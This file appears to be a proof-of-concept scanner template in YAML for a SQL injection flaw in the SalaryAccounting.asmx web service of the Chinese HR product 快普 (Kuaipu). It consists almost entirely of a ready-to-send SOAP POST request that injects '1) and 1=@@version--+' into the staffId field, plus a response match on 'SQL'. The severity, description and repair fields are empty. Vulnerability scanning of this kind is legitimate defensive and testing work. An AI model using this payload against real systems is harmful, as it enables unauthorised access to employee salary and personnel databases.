poc/快普/快普软件SalaryAccounting.asmxSQL注入.yaml

id:
info:
  name: 快普软件SalaryAccounting.asmxSQL注入
  severity:
  description:
  details:
  repair:
requests1:
  method: POST
  path: /WebService/HR/Salary/SalaryAccounting.asmx
  headers:
    SOAPAction: http://tempuri.org/Calculate
    Content-Type: text/xml;charset=UTF-8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
  data: |
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
    <soapenv:Header/>
    <soapenv:Body>
    <tem:Calculate>
    <!--type: string-->
    <tem:SalaryCategory></tem:SalaryCategory>
    <!--type: string-->
    <tem:StaffBirthDay></tem:StaffBirthDay>
    <!--type: string-->
    <tem:staffId>
    1) and 1=@@version--+</tem:staffId>
    <!--type: string-->
    <tem:Department></tem:Department>
    <!--type: string-->
    <tem:SubOrg></tem:SubOrg>
    <!--type: string-->
    <tem:taxMonthly></tem:taxMonthly>
    </tem:Calculate>
    </soapenv:Body>
    </soapenv:Envelope>
response1:
  headers:
  body: SQL
  code:
requests2:
response2: